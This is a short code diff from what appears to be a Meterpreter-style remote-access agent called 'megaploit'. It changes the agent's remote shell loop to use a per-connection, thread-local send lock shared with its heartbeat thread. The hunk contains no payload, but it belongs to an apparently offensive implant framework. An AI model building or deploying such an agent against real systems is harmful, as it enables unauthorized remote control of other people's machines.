@@ -19,18 +19,21 @@ import socket
 import time
 
 from megaploit.core.protocol import send_msg, recv_msg
-from megaploit.agent.handlers import handle
+from megaploit.agent.handlers import handle, _set_send_lock
 import megaploit.agent.meterp  # noqa: F401 — registers advanced handlers on import
 
 
 def run_shell(conn: socket.socket) -> None:
     """Block until the server sends 'exit' or the connection drops."""
+    import threading
     from megaploit.agent import handlers as _h
 
-    # Use the module-level send lock from handlers so that every handler that
-    # calls _send_msg/_send_file directly shares the same lock as the shell
-    # loop and the heartbeat thread — no PING can interleave any send.
-    _send_lock = _h._send_lock
+    # Create a FRESH lock for this connection and register it thread-locally.
+    # Each run_shell() call runs in its own thread, so threading.local() gives
+    # every connection its own lock — reconnecting agents never block on a lock
+    # held by a dead session's heartbeat thread.
+    _send_lock = threading.Lock()
+    _set_send_lock(_send_lock)
 
     # Start the background heartbeat PING sender (feature 6b)
     try:
